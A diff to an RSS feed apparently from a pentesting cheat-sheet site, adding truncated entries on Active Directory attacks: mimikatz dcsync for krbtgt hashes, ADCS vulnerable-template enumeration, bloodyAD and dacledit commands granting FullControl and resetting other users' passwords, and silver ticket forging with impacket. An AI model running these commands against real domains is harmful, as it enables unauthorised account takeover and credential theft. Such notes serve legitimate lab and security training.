@@ -15,11 +15,32 @@
       <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID .\mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain .\mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
     </item>
     <item>
+      <title>AD Recycle Bin</title>
+      <link>https://tldrbins.github.io/ad_recycle_bin/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
+      <description>Privesc #1: Restore deleted AD account Windows 1. Import AD module import-module activedirectory 2. Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects 3. Get all details for the deleted account Get-ADObject -filter { SAMAccountName -eq &amp;lt;DELETED_USER&amp;gt; } -includeDeletedObjects -property * 4. Restore the deleted account # Rename the target account to avoid user exists error Restore-ADObject -Identity &amp;lt;OBJECT_GUID&amp;gt; -NewName &amp;#39;&amp;lt;NEW_USER&amp;gt;&amp;#39; -TargetPath &amp;#39;CN=Users,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; </description>
+    </item>
+    <item>
+      <title>ADCS</title>
+      <link>https://tldrbins.github.io/adcs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adcs/</guid>
+      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .</description>
+    </item>
+    <item>
       <title>AddSelf</title>
       <link>https://tldrbins.github.io/addself/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/addself/</guid>
       <description>Privesc #1: Add self to group (From Linux) bloodyAD powerview.py 1. Add self to group # With password python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;GROUP&amp;gt; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; # With Kerberos python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; add groupMember &amp;lt;GROUP&amp;gt; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; 2. Add genericAll over target group # With password python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; add genericAll &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; # With Kerberos python3 bloodyAD.</description>
+    </item>
+    <item>
+      <title>GenericAll</title>
+      <link>https://tldrbins.github.io/genericall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericall/</guid>
+      <description>Abuse #1: Change target user password Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add Full Control to current user dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl 2. Change password bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Ref: bloodyAD&#xA;1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password Abuse #2: Get shadow credentials Linux 0.</description>
     </item>
     <item>
       <title>Kerberoasting</title>
@@ -69,6 +90,20 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/silver_ticket/</guid>
       <description>Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -request -k # If NTLM auth is disabled sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-host &amp;lt;DC&amp;gt; -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE &amp;lt;(printf &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;) | openssl dgst -md4 3. Get domain SID sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getPac -targetUser administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; 4. Generate Silver Ticket impacket-ticketer -nthash &amp;lt;HASH&amp;gt; -domain-sid &amp;lt;SID&amp;gt; -domain &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC&amp;gt; -spn &amp;lt;SPN&amp;gt; administrator 5.</description>
+    </item>
+    <item>
+      <title>Winrm from Windows VM</title>
+      <link>https://tldrbins.github.io/winrm_from_windows_vm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/winrm_from_windows_vm/</guid>
+      <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
+    </item>
+    <item>
+      <title>WriteOwner/Own</title>
+      <link>https://tldrbins.github.io/writeowner/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writeowner/</guid>
+      <description>Abuse #1 : Change owner of the group Windows 1. Import PowerView . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;lt;TARGET_GROUP&amp;gt; -OwnerIdentity &amp;lt;TARGET_USER&amp;gt; Abuse #2 : Add user to the group Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add full control permission to the user over the group sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target &amp;lt;TARGET_GROUP&amp;gt; -inheritance -action write -rights FullControl 2.</description>
     </item>
   </channel>
 </rss>
